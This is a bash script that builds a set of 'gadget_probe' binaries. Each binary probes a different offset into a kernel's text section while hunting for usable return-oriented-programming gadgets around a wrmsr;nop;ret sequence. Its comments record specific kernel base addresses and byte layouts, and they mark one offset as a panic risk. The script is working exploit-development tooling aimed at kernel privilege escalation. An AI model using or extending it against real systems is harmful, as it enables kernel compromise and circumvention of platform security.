#!/bin/bash
set -e
OUTDIR="bins"
mkdir -p "$OUTDIR"

build() {
    local name="$1" mode="$2" offset="$3"
    make clean -s 2>/dev/null || true
    make PROBE_MODE="$mode" TARGET_OFFSET="$offset" -s 2>&1 | grep -v warning || true
    cp gadget_probe.bin "$OUTDIR/${name}.bin"
    echo "  Built $name.bin (mode=$mode offset=$offset)"
}

echo "=== Building gadget_probe binaries ==="
echo ""
echo "Known layout at wrmsr;nop;ret:"
echo "  -0x9d20cc = 0x0f (wrmsr byte1) ← PANIC DANGER"
echo "  -0x9d20cb = 0x30 (wrmsr byte2)"
echo "  -0x9d20ca = 0x90 (nop) = nop_ret"
echo "  -0x9d20c9 = 0xc3 (ret)"
echo ""

# === SAFE: nop;ret itself and 1 byte before (already tested) ===
echo "--- Baseline & nopret-1 (already tested, thread dies) ---"
build "gadget_probe_nopret_m0"     0 "-0x9d20ca"
build "gadget_probe_nopret-1_m0"   0 "-0x9d20cb"

# === SAFE: Forward past the ret — next function(s) ===
# After 0xc3 (ret) at -0x9d20c9, whatever follows is a new function.
# We scan forward: each byte might have its own ret nearby.
echo ""
echo "--- Forward scan past nop;ret (into next function) ---"
for i in $(seq 2 30); do
    hex=$(printf '%x' $((0x9d20c9 - i)))
    build "gadget_probe_fwd+${i}_m0" 0 "-0x${hex}"
done

# === SAFE: Distant ktext regions (far from wrmsr) ===
# ktext_base=0xffffffffd18e0000, kdata_base=0xffffffffd24e0000
# ktext size ~0xC00000. Pick scattered offsets.
# Offset from kdata_base: -(0xC00000 - X) where X is offset into ktext
echo ""
echo "--- Scattered ktext probes (far from wrmsr) ---"
# Near common function boundaries: try offsets at page boundaries
# ktext starts at kdata - 0xC00000, so ktext+0 = kdata + (-0xC00000)
# Let's probe at various ktext offsets

# These are offsets from kdata_base (negative = into ktext)
# Spread across ktext: early, middle, late sections
SCATTERED=(
    "-0xBF0000"   # ktext + 0x10000 (early)
    "-0xBE0000"   # ktext + 0x20000
    "-0xBD0000"   # ktext + 0x30000
    "-0xB00000"   # ktext + 0x100000
    "-0xAF0000"   # ktext + 0x110000
    "-0xA00000"   # ktext + 0x200000
    "-0x9F0000"   # ktext + 0x210000
    "-0x9E0000"   # ktext + 0x220000
    "-0x9D0000"   # ktext + 0x230000 (near wrmsr area but different page)
    "-0x9C0000"   # ktext + 0x240000
)

for off in "${SCATTERED[@]}"; do
    clean=$(echo "$off" | tr -d '-')
    build "gadget_probe_ktext_${clean}_m0" 0 "$off"
done

echo ""
echo "=== Done! ==="
ls -la "$OUTDIR/"
echo ""
echo "Total binaries: $(ls "$OUTDIR/"*.bin | wc -l)"
